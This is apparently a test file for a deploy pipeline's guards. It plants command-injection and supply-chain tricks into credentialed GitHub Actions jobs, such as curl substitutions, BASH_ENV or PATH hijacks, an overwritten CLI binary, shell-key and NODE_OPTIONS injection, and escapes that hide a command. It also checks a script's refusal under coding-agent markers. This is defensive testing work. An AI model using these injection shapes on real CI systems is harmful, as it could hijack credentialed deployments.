              migratedCommit: null,
              services: {
                api: `hearth-${env}-api:1`,
                realtime: `hearth-${env}-realtime:1`,
                worker: `hearth-${env}-worker:1`,
              },
            },
          },
        ],
        env,
      ).records
    const input = (overrides: Partial<PlanInput>): PlanInput => ({
      event: 'workflow_dispatch',
      ref: 'refs/heads/main',
      actor: 'a-person',
      triggeringActor: 'a-person',
      sha: m[2] ?? '',
      target: 'nonprod',
      mode: 'deploy',
      release: '',
      restore: 'none',
      records: { nonprod: record('nonprod', 11, m[0] ?? ''), prod: record('prod', 21, m[0] ?? '') },
      checks: {
        pull: 7,
        base: 'main',
        mergeCommit: m[2] ?? '',
        headTree: git(['rev-parse', `${m[2]}^{tree}`]),
        check: 'success',
        migrations: 'success',
      },
      treeOf: sha => git(['rev-parse', `${sha}^{tree}`]),
      isAncestor: gitIsAncestor(repo),
      floorsAllowed: () => true,
      expansionsMet: () => true,
      domains: ['app.hearth.example', 'content.hearth.example'],
      ...overrides,
    })
    const refusal = async (overrides: Partial<PlanInput>) => {
      const result = await plan(input(overrides))
      return result.ok ? 'allowed' : result.reason
    }

    it('allows a person’s deploy and rollback, and refuses each planted breakage with its own code', async () => {
      expect(await refusal({})).toBe('allowed')
      expect(await refusal({ mode: 'rollback', release: m[0] ?? '' })).toBe('allowed')
      expect(await refusal({ actor: 'dependabot[bot]' })).toBe('bot-actor')
      expect(await refusal({ triggeringActor: 'github-actions[bot]' })).toBe('bot-actor')
      expect(await refusal({ ref: 'refs/heads/side' })).toBe('not-main')
      expect(await refusal({ target: 'prod', mode: 'drill-break' })).toBe('drill-not-nonprod')
      expect(await refusal({ target: 'restore', mode: 'drill-smoke' })).toBe('drill-not-nonprod')
      expect(await refusal({ target: 'restore', restore: 'none' })).toBe('restore-misnamed')
      expect(await refusal({ target: 'nonprod', restore: 'up' })).toBe('restore-misnamed')
      expect(await refusal({ release: m[0] ?? '' })).toBe('release-unexpected')
      expect(await refusal({ mode: 'rollback' })).toBe('release-missing')
      expect(await refusal({ mode: 'rollback', release: 'main' })).toBe('bad-release')
      expect(await refusal({ mode: 'rollback', release: side })).toBe('off-main')
      expect(await refusal({ domains: ['app.hearth.invalid'] })).toBe('domains-placeholder')
    })
  })

  // No coding agent runs apply by any route (CLAUDE.md), so the refusal every command but check makes under
  // an agent or CI marker is proved on the script run with no command: under each marker, set empty, it
  // refuses before anything else runs, gh included; under none it prints its usage.
  it('refuses every command but check under each agent marker, first', () => {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-dpw09-markers-'))
    try {
      writeFileSync(join(folder, 'gh'), `#!/bin/sh\necho "$@" >>'${join(folder, 'gh-calls')}'\n`, { mode: 0o755 })
      const run = (marker?: string) => {
        const result = spawnSync('bash', [join(root, 'scripts/protect-environments.sh')], {
          encoding: 'utf8',
          env: {
            PATH: `${folder}:${process.env.PATH ?? ''}`,
            HOME: folder,
            ...(marker === undefined ? {} : { [marker]: '' }),
          },
        })
        return { status: result.status, stderr: result.stderr.trim() }
      }
      for (const marker of AGENT_MARKERS) {
        expect(run(marker)).toEqual({
          status: 1,
          stderr: `protect-environments: refused while ${marker} is set: a repo admin runs apply as the separate operating-system user that holds their gh login, never a coding agent or CI`,
        })
      }
      expect(run()).toEqual({
        status: 2,
        stderr: 'usage: scripts/protect-environments.sh check [--from <dir>] [owner/repo] | apply [owner/repo]',
      })
      expect(readdirSync(folder)).toEqual(['gh'])
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })

  // protect-environments.sh check --from compares saved answers with the files, field by field; it only
  // reads, and here it reads planted answers alone (never GitHub).
  describe('protect-environments.sh check --from on planted answers', () => {
    let dir = ''
    const write = (name: string, value: unknown) => writeFileSync(join(dir, name), JSON.stringify(value))
    const settings = (name: string, reviewers: number) => ({
      name,
      can_admins_bypass: false,
      protection_rules: [
        { type: 'branch_policy' },
        ...(reviewers > 0
          ? [
              {
                type: 'required_reviewers',
                prevent_self_review: false,
                reviewers: Array.from({ length: reviewers }, () => ({ type: 'User' })),
              },
            ]
          : []),
      ],
      deployment_branch_policy: { protected_branches: false, custom_branch_policies: true },
    })
    const good = () => {
      for (const [name, reviewers] of [
        ['nonprod', 0],
        ['prod-plan', 0],
        ['prod', 1],
      ] as const) {
        write(`${name}.json`, settings(name, reviewers))
        write(`${name}-branch-policies.json`, { total_count: 1, branch_policies: [{ name: 'main', type: 'branch' }] })
        write(`${name}-protection-rules.json`, { total_count: 0, custom_deployment_protection_rules: [] })
      }
      write('oidc.json', { use_default: false, include_claim_keys: ['repo', 'context', 'job_workflow_ref'] })
    }
    const check = () => {
      const result = spawnSync('bash', [join(root, 'scripts/protect-environments.sh'), 'check', '--from', dir], {
        encoding: 'utf8',
      })
      return { status: result.status, lines: result.stdout.trim().split('\n') }
    }
    beforeAll(() => {
      dir = mkdtempSync(join(tmpdir(), 'hearth-dpw09-answers-'))
    })
    afterAll(() => {
      if (dir !== '') rmSync(dir, { recursive: true, force: true })
    })

    it('passes the answers as written and names the field of each planted mismatch', () => {
      const ok = [
        'protect-environments: nonprod ok',
        'protect-environments: prod-plan ok',
        'protect-environments: prod ok',
        'protect-environments: oidc ok',
      ]
      good()
      expect(check()).toEqual({ status: 0, lines: ok })
      const planted = (change: () => void, line: string) => {
        good()
        change()
        // The environment's own ok line becomes its one finding; the others stay ok.
        const name = line.split(' ')[1]
        expect(check()).toEqual({ status: 1, lines: ok.map(each => (each.split(' ')[1] === name ? line : each)) })
      }
      planted(() => write('prod.json', settings('prod', 0)), 'protect-environments: prod required_reviewers differs')
      planted(
        () => write('nonprod.json', settings('nonprod', 1)),
        'protect-environments: nonprod required_reviewers differs',
      )
      planted(
        () =>
          write('prod.json', {
            ...settings('prod', 1),
            protection_rules: [...settings('prod', 1).protection_rules, { type: 'wait_timer', wait_timer: 30 }],
          }),
        'protect-environments: prod wait_timer differs',
      )
      planted(
        () => write('prod.json', { ...settings('prod', 1), can_admins_bypass: true }),
        'protect-environments: prod can_admins_bypass differs',
      )
      planted(() => {
        const { can_admins_bypass: _, ...rest } = settings('prod-plan', 0)
        write('prod-plan.json', rest)
      }, 'protect-environments: prod-plan can_admins_bypass differs')
      planted(
        () =>
          write('nonprod-branch-policies.json', {
            branch_policies: [
              { name: 'main', type: 'branch' },
              { name: 'x', type: 'branch' },
            ],
          }),
        'protect-environments: nonprod branch_policies differs',
      )
      planted(
        () => write('prod-protection-rules.json', { custom_deployment_protection_rules: [{ id: 1 }] }),
        'protect-environments: prod custom_deployment_protection_rules differs',
      )
      planted(
        () => write('oidc.json', { use_default: true, include_claim_keys: ['repo', 'context', 'job_workflow_ref'] }),
        'protect-environments: oidc use_default differs',
      )
      planted(() => rmSync(join(dir, 'prod-plan.json')), 'protect-environments: prod-plan settings differs')
      // Every other field check compares, each planted alone (round 2's ENVS-02).
      const prod = () => settings('prod', 1)
      const reviewersRule = (change: Record<string, unknown>) => ({
        ...prod(),
        protection_rules: prod().protection_rules.map(rule =>
          rule.type === 'required_reviewers' ? { ...rule, ...change } : rule,
        ),
      })
      planted(() => write('prod.json', { ...prod(), name: 'Prod' }), 'protect-environments: prod name differs')
      planted(
        () => write('prod.json', reviewersRule({ prevent_self_review: true })),
        'protect-environments: prod prevent_self_review differs',
      )
      planted(() => {
        const rule = { type: 'required_reviewers', reviewers: [{ type: 'User' }] }
        write('prod.json', { ...prod(), protection_rules: [{ type: 'branch_policy' }, rule] })
      }, 'protect-environments: prod prevent_self_review differs')
      planted(
        () => write('prod.json', reviewersRule({ reviewers: [] })),
        'protect-environments: prod required_reviewers differs',
      )
      planted(
        () =>
          write('nonprod.json', {
            ...settings('nonprod', 0),
            protection_rules: [...settings('nonprod', 0).protection_rules, { type: 'x' }],
          }),
        'protect-environments: nonprod protection_rules differs',
      )
      planted(
        () =>
          write('prod.json', {
            ...prod(),
            deployment_branch_policy: { protected_branches: true, custom_branch_policies: false },
          }),
        'protect-environments: prod deployment_branch_policy differs',
      )
      planted(
        () => write('prod.json', { ...prod(), deployment_branch_policy: null }),
        'protect-environments: prod deployment_branch_policy differs',
      )
      planted(
        () => write('prod-branch-policies.json', { total_count: 1, branch_policies: [{ name: 'main', type: 'tag' }] }),
        'protect-environments: prod branch_policies differs',
      )
      planted(
        () => write('oidc.json', { use_default: false, include_claim_keys: ['context', 'repo', 'job_workflow_ref'] }),
        'protect-environments: oidc include_claim_keys differs',
      )
    }, 30_000)
  })
})

describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials are', () => {
  const at = (where: string, rule: string) => `${DEPLOY}: DPW-10 ${where}: ${rule}`
  const RUNS =
    'runs nothing but bash’s own, its functions, gh api, git merge-base, jq, the text tools, aws, skopeo, the pinned CLI, CLI_FETCH’s fetch, IMAGE_CHECK’s listing and unpacking and the preamble’s stop token, and names no npm, npx, node, shell, source, eval, docker, python, make, curl or wget but that fetch, or script: no tool is handed a program to run'
  const WRITES = "writes no file but its outputs, its summary, prod-plan's diff and /dev/null"
  // Every run of a credentialed job is pinned whole, so a plant in any of them is that finding too.
  const pinned = (where: string) => at(where, PINNED_10)
  const LOADER =
    "sets no PATH, HOME (but CDK_FOLDER's), BASH_ENV or other variable that chooses what runs, and writes neither GITHUB_ENV nor GITHUB_PATH"
  const JOB_KEYS =
    'holds only needs, if, runs-on, timeout-minutes, cache-mode, permissions, environment, concurrency, outputs, env and steps, each once: no container, services, defaults, strategy, uses or continue-on-error'
  const STEP_KEYS =
    'holds only name, id, if, uses, with, env and run (and working-directory in synth), each once: no shell or continue-on-error'
  const WITH = 'gives its action only the inputs the workflow uses: no repository, run-id, token or other source'
  const WITH_WHOLE =
    'gives its action exactly the inputs STEP_WITHS names, each its value: no checkout names a ref or a path but synth’s three, each its own commit into its own folder, and no download, upload, Node or credentials input is another'
  const ENV =
    'sets only the environment variables the workflow uses, each to the value STEP_ENVS names (a job, STAGE alone): no BASH_ENV, PATH or NODE_OPTIONS, and no input from another step, job or context'
  const REFUSED = 'passes none of the CLI’s refused flags or subcommands'
  const DEFINES =
    'defines a function only where a canonical text (the preamble, ASSET_CHECK, AWS_CHECK, TASKS_OUTPUTS, ONE_OFF or NEWEST_RELEASE) does, as it does'
  const SETS =
    "sets a variable by printf -v, read, mapfile or for only on a canonical text's line, or the read-back's or the release loop's"
  const CLI =
    'runs the CLI only as deploy or diff, with --app "$ASSEMBLY" (set once to the folder it downloaded), after CDK_FOLDER and no other change of folder, with --no-lookups --no-notices, and a deploy with --require-approval never --ci --exclusively'
  const readBack = (id: string) => `${id} (Read back what runs)`
  const STEPS =
    'runs the steps JOB_STEPS names, in order, each by its name with the action it names (a run step none): no step of its own before, between or after them, and none dropped or moved'
  const FILES =
    'names no GITHUB_ENV, GITHUB_PATH or GITHUB_STATE, in any job: no step hands a later one of its job a variable (BASH_ENV, say, which bash reads before a pinned run), a folder to search first or a state'
  // A planted line refused by the table, at its line in the read-back's run (eight lines after the preamble,
  // where added() plants), and a command it reads that isn't held to its uses.
  const PLANTED_AT = PREAMBLE.split('\n').length + 8
  const refused = (id: string, line = PLANTED_AT) => at(`${readBack(id)}, line ${line}`, AS_BASH)
  const held = (id: string) => at(readBack(id), HELD)
  const added = (id: string, line: string) =>
    credentialedCodeFindings(
      addedBefore(id, 'Read back what runs', "          SERVICE_LIST='[]'\n", `          ${line}\n`),
      manifests,
      lockfile,
    )
  const find = (from: string, to: string, after: string) =>
    credentialedCodeFindings(plant(from, to, after), manifests, lockfile)
  const services = '      - name: Deploy Services\n'

  it('finds each planted breakage in a credentialed job', () => {
    const runsHeld = [at(readBack('nonprod'), RUNS), held('nonprod')]
    expect(added('nonprod', 'npm run synth -w @hearth/infra')).toEqual(runsHeld)
    expect(added('prod', 'node infra/scripts/deploy/history.ts migrated --records x')).toEqual([
      at(readBack('prod'), RUNS),
      held('prod'),
    ])
    expect(added('nonprod', 'bash scripts/x.sh')).toEqual(runsHeld)
    expect(added('nonprod', 'npx cdk deploy')).toEqual(runsHeld)
    expect(added('nonprod', 'docker load -i x.tar')).toEqual(runsHeld)
    expect(added('nonprod', 'X=$(curl -s x)')).toEqual(runsHeld)
    expect(added('nonprod', './scripts/x.ts')).toEqual(runsHeld)
    expect(added('nonprod', '"$TOOL" x')).toEqual([at(readBack('nonprod'), RUNS), refused('nonprod')])
    // Round 4's ACTIONS-01 and SECURITY-01: no npm where the OIDC request token is (it would read the
    // repository's .npmrc and lockfile, and the runner's npm 10 runs a git dependency's prepare script), and
    // CLI_FETCH's tools only on its own lines, in its run whole.
    const npmInstead = find(
      CLI_FETCH.split('\n').slice(1).join('\n          '),
      'npm ci --ignore-scripts -w @hearth/infra',
      job('nonprod'),
    )
    expect(npmInstead).toContain(pinned('nonprod (The pinned CDK CLI)'))
    expect(npmInstead).toContain(at('nonprod (The pinned CDK CLI)', RUNS))
    expect(npmInstead).toContain(
      at(
        'nonprod',
        'fetches only the pinned CLI (CLI_FETCH, never npm), then runs CLI_CHECK, before the credentials action',
      ),
    )
    const curl = CLI_FETCH.split('\n').find(line => line.startsWith('curl ')) ?? ''
    expect(added('nonprod', curl)).toContain(at(readBack('nonprod'), RUNS))
    const tar = CLI_FETCH.split('\n').find(line => line.startsWith('tar ')) ?? ''
    expect(added('nonprod', tar)).toContain(at(readBack('nonprod'), RUNS))
    const elsewhere = find(
      'https://registry.npmjs.org/aws-cdk/-/aws-cdk-$pin.tgz"',
      'https://registry.example.invalid/aws-cdk-$pin.tgz"',
      job('nonprod'),
    )
    expect(elsewhere).toContain(pinned('nonprod (The pinned CDK CLI)'))
    expect(elsewhere).toContain(at('nonprod (The pinned CDK CLI)', RUNS))
    expect(added('nonprod', 'jq() { :; }')).toEqual([refused('nonprod'), at(readBack('nonprod'), DEFINES)])
    expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --no-rollback', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
    ])
    expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --hotswap', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
    ])
    expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --all', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
    ])
    expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --role-arn x', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
    ])
    expect(find('run "$CDK" deploy --app', 'run "$CDK" destroy --app', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(
      find(
        'run "$CDK" deploy --app',
        'run "$CDK" rollback --orphan x --app',
        '      - name: Roll back to the target\n',
      ),
    ).toEqual([
      pinned('nonprod (Roll back to the target)'),
      at('nonprod (Roll back to the target)', REFUSED),
      at('nonprod (Roll back to the target)', HELD),
      at('nonprod (Roll back to the target)', CLI),
    ])
    expect(find('--no-lookups ', '', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', HELD),
      at('nonprod (Deploy Services)', CLI),
    ])
    // A change of folder, cd, is a builtin the table refuses outside a canonical text.
    expect(
      find(`          ${CDK_FOLDER}\n`, `          ${CDK_FOLDER}\n          cd "$GITHUB_WORKSPACE/infra"\n`, services),
    ).toEqual([
      pinned('nonprod (Deploy Services)'),
      at(`nonprod (Deploy Services), line ${PREAMBLE.split('\n').length + 5}`, AS_BASH),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(find('ASSEMBLY="$RUNNER_TEMP/assembly"', 'ASSEMBLY="$RUNNER_TEMP/assembly-previous"', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(
      find(
        'CDK="$RUNNER_TEMP/aws-cdk/package/bin/cdk"',
        'CDK="$GITHUB_WORKSPACE/node_modules/.bin/cdk"',
        '      - name: What runs\n',
      ),
    ).toEqual([
      pinned('nonprod (What runs)'),
      at(
        'nonprod (What runs)',
        'assigns CDK only in the preamble, as the bin of the registry package CLI_FETCH unpacked',
      ),
      // The preamble changed is no preamble, so its lines after STOP_HEAD, which still stands whole, are the
      // run's own: the table refuses the first function it doesn't name, and its mask, run and get are
      // functions of the run's own.
      at(`nonprod (What runs), line ${PREAMBLE.split('\n').findIndex(line => line.startsWith('mask()')) + 1}`, AS_BASH),
      at('nonprod (What runs)', DEFINES),
    ])
    expect(
      credentialedCodeFindings(
        copiedStep('gate', 'Node, from .nvmrc', 'prod', 'The pinned CDK CLI'),
        manifests,
        lockfile,
      ),
    ).toEqual([
      at('prod', STEPS),
      at('prod (Node, from .nvmrc)', WITH_WHOLE),
      at('prod (Node, from .nvmrc)', 'uses only checkout, download-artifact and the credentials action'),
    ])
    expect(credentialedCodeFindings(removedStep('nonprod', "The CLI is the registry's"), manifests, lockfile)).toEqual([
      at('nonprod', STEPS),
      pinned("nonprod (The CLI is the registry's)"),
      at(
        'nonprod',
        'fetches only the pinned CLI (CLI_FETCH, never npm), then runs CLI_CHECK, before the credentials action',
      ),
    ])
  }, 30_000)

  // openssl makes the preamble's stop token (EXPAND-A4-01), on that line of the preamble alone; anywhere
  // else in a credentialed run it is refused, as it was, whatever it is given.
  it('admits openssl only on the preamble’s stop-token line (EXPAND-A4-01)', () => {
    for (const line of ['X=$(openssl rand -hex 16)', 'openssl enc -d -in x -out y']) {
      expect(added('nonprod', line), line).toContain(at(readBack('nonprod'), RUNS))
    }
  })

  // A tool allowed for its plain use handed a program to run, a file the CLI then runs rewritten, or a
  // variable set that chooses what a later command runs: each with the credentials in hand.
  it('finds a tool handed a program, a file rewritten and a variable that chooses what runs', () => {
    const runs = [at(readBack('nonprod'), RUNS)]
    const runsRefused = [...runs, refused('nonprod')]
    const runsHeld = [...runs, held('nonprod')]
    expect(added('nonprod', 'find . -name x -exec node {} \\;')).toEqual(runsRefused)
    expect(added('nonprod', 'find . -name x -execdir true {} +')).toEqual(runsRefused)
    expect(added('nonprod', "trap 'npx cdk deploy' EXIT")).toEqual(runsRefused)
    expect(added('nonprod', "echo | sed -e '1e node x.js'")).toEqual(runsRefused)
    expect(added('nonprod', 'sort --compress-program=node x')).toEqual(runsHeld)
    // sha256sum only on ASSET_CHECK's line that hashes a file asset from its input (round 5, attack 2).
    expect(added('nonprod', 'sha256sum -c "$RUNNER_TEMP/x"')).toEqual(runsHeld)
    expect(added('nonprod', 'X=$(sha256sum <"$RUNNER_TEMP/x")')).toEqual(runsHeld)
    expect(added('nonprod', "git -c alias.x='!node y.js' x")).toEqual(runsHeld)
    expect(added('nonprod', 'gh extension exec x')).toEqual(runsHeld)
    expect(added('nonprod', 'X=node; echo $X')).toEqual(runsRefused)
    expect(added('nonprod', 'mapfile -C cb -c 1 X <"$RUNNER_TEMP/x"')).toEqual([
      ...runsRefused,
      at(readBack('nonprod'), SETS),
    ])
    expect(added('nonprod', 'cat "$RUNNER_TEMP/assembly/x" > node_modules/aws-cdk/bin/cdk')).toEqual([
      refused('nonprod'),
      at(readBack('nonprod'), WRITES),
    ])
    expect(added('nonprod', 'echo "BASH_ENV=$RUNNER_TEMP/x" >> "$GITHUB_ENV"')).toEqual([
      at(readBack('nonprod'), FILES),
      refused('nonprod'),
      at(readBack('nonprod'), WRITES),
      at(readBack('nonprod'), LOADER),
    ])
    expect(added('nonprod', 'export PATH="$RUNNER_TEMP/assembly:$PATH"')).toEqual([
      refused('nonprod'),
      at(readBack('nonprod'), LOADER),
    ])
    expect(added('nonprod', 'HOME="$RUNNER_TEMP/assembly"')).toEqual([
      refused('nonprod'),
      at(readBack('nonprod'), LOADER),
    ])
  }, 30_000)

  // A program run through a wrapper or after a redirection, a function out of its step or its canonical
  // text, a tool that writes the file the CLI then runs, and a variable set by printf -v, read, for or an
  // arithmetic or default assignment: each with the credentials in hand.
  it('finds a wrapper, a redirection first, a function of its own and a tool that writes the file the CLI runs', () => {
    const runs = [at(readBack('nonprod'), RUNS)]
    // A builtin the table refuses (command, exec, time, builtin, set but -euo pipefail, local given a flag) or a
    // redirection before a command's word is refused as written; a program it reads is held to its uses.
    for (const line of [
      'command -p ./scripts/x.sh',
      'exec -a name ./scripts/x.sh',
      'time -p ./scripts/x.sh',
      "command -p awk 'BEGIN{system(1)}'",
      'builtin echo x',
      '>/dev/null ./scripts/x.sh',
      '</dev/null cp "$RUNNER_TEMP/assembly/x" node_modules/aws-cdk/bin/cdk',
      'set -- ./scripts/x.sh; "$@"',
      'local -n ref=PATH',
    ]) {
      expect(added('nonprod', line), line).toEqual([...runs, refused('nonprod')])
    }
    for (const line of [
      'nohup -- ./scripts/x.sh',
      'timeout -s KILL 5 ./scripts/x.sh',
      'sudo -E true',
      'xargs -0 true',
      'env -0',
      'uniq "$RUNNER_TEMP/assembly/x" node_modules/aws-cdk/bin/cdk',
      'run aws s3 cp s3://x/y node_modules/aws-cdk/bin/cdk',
    ]) {
      expect(added('nonprod', line), line).toEqual([...runs, held('nonprod')])
    }
    expect(added('nonprod', 'cp() { command cp "$@"; }\n          cp a node_modules/aws-cdk/bin/cdk')).toEqual([
      ...runs,
      refused('nonprod'),
      at(readBack('nonprod'), DEFINES),
    ])
    expect(added('nonprod', 'function jq { :; }')).toEqual([refused('nonprod'), at(readBack('nonprod'), DEFINES)])
    // A function defined in one step and called in another, where bash no longer has it.
    const readBackStep = stepText(deployText, 'nonprod', 'Read back what runs')
    const recheckStep = stepText(deployText, 'nonprod', 'The fast re-check')
    const newest = '          newest=$(newest_release nonprod)\n'
    const crossed = edited(
      edited(
        deployText,
        readBackStep,
        edited(readBackStep, "          SERVICE_LIST='[]'\n", "          cp() { :; }\n          SERVICE_LIST='[]'\n"),
        job('nonprod'),
      ),
      recheckStep,
      edited(recheckStep, newest, `          cp a node_modules/aws-cdk/bin/cdk\n${newest}`),
      job('nonprod'),
    )
    expect(credentialedCodeFindings(withText(DEPLOY, crossed), manifests, lockfile)).toEqual([
      pinned('nonprod (The fast re-check)'),
      at('nonprod (The fast re-check)', RUNS),
      at('nonprod (The fast re-check)', HELD),
      refused('nonprod'),
      at(readBack('nonprod'), DEFINES),
    ])
  }, 30_000)

  // A variable that chooses what runs, or which assembly the CLI deploys, set by printf -v, read, mapfile,
  // for, an arithmetic or a default assignment, or by NAME= where it may not be.
  it('finds a variable that chooses what runs set otherwise than by NAME=, and one set where it may not be', () => {
    // Each is refused by the table too: printf -v, read, a for loop or mapfile naming one of bash's own
    // variables (and jq given no program it reads).
    for (const line of ["printf -v PATH '%s' x", 'read -r PATH <<<"x"', 'for PATH in x; do jq -n 1; done']) {
      expect(added('nonprod', line), line).toEqual([refused('nonprod'), at(readBack('nonprod'), SETS)])
    }
    expect(added('nonprod', 'mapfile -t PATH < <(jq -n 1)')).toEqual([
      refused('nonprod'),
      held('nonprod'),
      at(readBack('nonprod'), SETS),
    ])
    expect(added('nonprod', 'GITHUB_OUTPUT=node_modules/aws-cdk/bin/cdk')).toEqual([at(readBack('nonprod'), LOADER)])
    for (const line of ['export TMPDIR="$GITHUB_WORKSPACE"', `: "\${RUNNER_TEMP:=x}"`]) {
      expect(added('nonprod', line), line).toEqual([refused('nonprod'), at(readBack('nonprod'), LOADER)])
    }
    // An arithmetic one is refused for its arithmetic too, off a canonical text's lines.
    expect(added('nonprod', '(( PATH = 1 ))')).toEqual([refused('nonprod'), at(readBack('nonprod'), LOADER)])
    // The assembly the CLI deploys, chosen otherwise than by its one line.
    const deployServices = (line: string, added: string) =>
      credentialedCodeFindings(addedBefore('nonprod', 'Deploy Services', line, added), manifests, lockfile)
    const assembly = '          ASSEMBLY="$RUNNER_TEMP/assembly"\n'
    expect(deployServices(assembly, '          RUNNER_TEMP="$GITHUB_WORKSPACE"\n')).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', LOADER),
    ])
    expect(deployServices(assembly, "          printf -v RUNNER_TEMP '%s' x\n")).toEqual([
      pinned('nonprod (Deploy Services)'),
      at(`nonprod (Deploy Services), line ${PREAMBLE.split('\n').length + 3}`, AS_BASH),
      at('nonprod (Deploy Services)', SETS),
    ])
    const folder = `          ${CDK_FOLDER}\n`
    expect(deployServices(folder, '          read -r ASSEMBLY <<<"x"\n')).toEqual([
      pinned('nonprod (Deploy Services)'),
      at(`nonprod (Deploy Services), line ${PREAMBLE.split('\n').length + 4}`, AS_BASH),
      at('nonprod (Deploy Services)', SETS),
    ])
    expect(deployServices(folder, '          ASSEMBLY+=/x\n')).toEqual([
      pinned('nonprod (Deploy Services)'),
      at(`nonprod (Deploy Services), line ${PREAMBLE.split('\n').length + 4}`, AS_BASH),
      at('nonprod (Deploy Services)', CLI),
    ])
    // The run is no longer DIFF_RUN whole, so the tr and sed that set its summary's code block are refused too.
    expect(find('DIFF="$RUNNER_TEMP/diff.txt"', 'DIFF=node_modules/aws-cdk/bin/cdk', job('prod-plan'))).toEqual([
      at('prod-plan (Diff)', RUNS),
      at('prod-plan (Diff)', WRITES),
    ])
  }, 30_000)

  // A job or step key, an action input or an env: key that runs a program, or changes what runs, unseen.
  it('finds a key that runs a program or changes what runs', () => {
    const credentialed = (planted: ReadonlyMap<string, string>) =>
      credentialedCodeFindings(planted, manifests, lockfile)
    const readBackStep = '      - name: Read back what runs\n        id: readback\n'
    expect(
      find(readBackStep, `${readBackStep}        shell: npx --yes cdk deploy --all; bash {0}\n`, job('nonprod')),
    ).toEqual([at(readBack('nonprod'), STEP_KEYS)])
    expect(find(readBackStep, `${readBackStep}        continue-on-error: true\n`, job('nonprod'))).toEqual([
      at(readBack('nonprod'), STEP_KEYS),
    ])
    expect(find(readBackStep, `${readBackStep}        working-directory: infra\n`, job('nonprod'))).toEqual([
      at(readBack('nonprod'), STEP_KEYS),
    ])
    const cache = '    cache-mode: none\n'
    for (const added of [
      '    defaults:\n      run:\n        shell: node {0}\n',
      '    container:\n      image: node:24\n',
      '    services:\n      helper:\n        image: alpine:3\n',
      '    strategy:\n      matrix:\n        x: [a, b]\n',
      '    continue-on-error: true\n',
    ]) {
      expect(find(cache, `${cache}${added}`, job('nonprod'))).toEqual([at('nonprod', JOB_KEYS)])
    }
    expect(find('    runs-on: ubuntu-24.04\n', '    runs-on: [self-hosted, linux]\n', job('prod'))).toEqual([
      at('prod', "runs on ubuntu-24.04, GitHub's own runner"),
    ])
    expect(
      find(
        'permissions:\n  contents: read\njobs:',
        'permissions:\n  contents: read\ndefaults:\n  run:\n    shell: node {0}\njobs:',
        '',
      ),
    ).toEqual([at('the top level', 'holds only name, on, permissions and jobs: no env, defaults or concurrency')])
    const persist = '          persist-credentials: false\n'
    expect(find(persist, `${persist}          repository: x/y\n`, job('nonprod'))).toEqual([
      at("nonprod (Check out the run's commit)", WITH),
      at("nonprod (Check out the run's commit)", WITH_WHOLE),
    ])
    const ids = `          artifact-ids: \${{ needs.synth.outputs.assembly }}\n`
    expect(find(ids, `${ids}          run-id: 1\n          github-token: x\n`, job('nonprod'))).toEqual([
      at('nonprod (Download the assembly)', WITH),
      at('nonprod (Download the assembly)', WITH_WHOLE),
    ])
    expect(
      find('      STAGE: nonprod\n', '      STAGE: nonprod\n      BASH_ENV: infra/x.sh\n', job('nonprod')),
    ).toEqual([at('nonprod', ENV)])
    expect(
      credentialed(
        withText(
          DEPLOY,
          edited(
            deployText,
            '        env:\n',
            '        env:\n          NODE_OPTIONS: --require ./x.js\n',
            '      - name: What runs\n',
          ),
        ),
      ),
    ).toEqual([at('nonprod (What runs)', ENV)])
  }, 30_000)

  // GUARDS-01: each shape that once hid a command from the reader, here the CLI overwritten by a file of the
  // synth's artifact (which a job running repository code made), planted in a credentialed step. Each is
  // found: by the command it hides (the regex reader, kept as a second layer, finds most), and by the table,
  // which names none of these shapes (an unquoted backslash, a # but a comment's, [[ or a case's subject
  // unquoted, a case inside a substitution or a substitution as a command's word), at its line.
  it('finds a command an escape, a [[ or case argument, a case or a substitution would hide', () => {
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    const both = [at(readBack('nonprod'), RUNS), refused('nonprod')]
    for (const line of [
      `echo a\\ #;${cp}`,
      `echo ok\\\n          #;${cp}`,
      `X="$(case x in x) ${cp};; esac)"`,
      `echo [[ ; ${cp} ; echo ]]`,
      `X=$(echo case in\n          ${cp})`,
      `case x in x) ${cp};; esac`,
      `case x in\n            x) :;; true) ${cp};;\n          esac`,
    ]) {
      expect(added('nonprod', line), line).toEqual(both)
    }
    expect(added('nonprod', '$(echo cp) "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk')).toEqual([
      refused('nonprod'),
    ])
  }, 30_000)

  // Round 2's GUARDS-01 and GUARDS-02: what the reader once blanked or never read as a command, each in front
  // of a cp over the CLI's bin from the synth's artifact. A # right after a substitution's ) is part of its
  // word, so what follows runs and is read; so does what follows a ${…} with a blank in it, an ANSI-C string
  // with an escaped quote, a keyword that is an argument; a backtick substitution, a here-document and
  // anything bash evaluates as arithmetic or a name (where a quoted or constructed $( … ) runs) are refused.
  it('finds what a substitution’s ), a parameter expansion, backticks, an ANSI-C string, a here-document, arithmetic or a keyword argument would hide', () => {
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    const only = [refused('nonprod')]
    const both = [at(readBack('nonprod'), RUNS), refused('nonprod')]
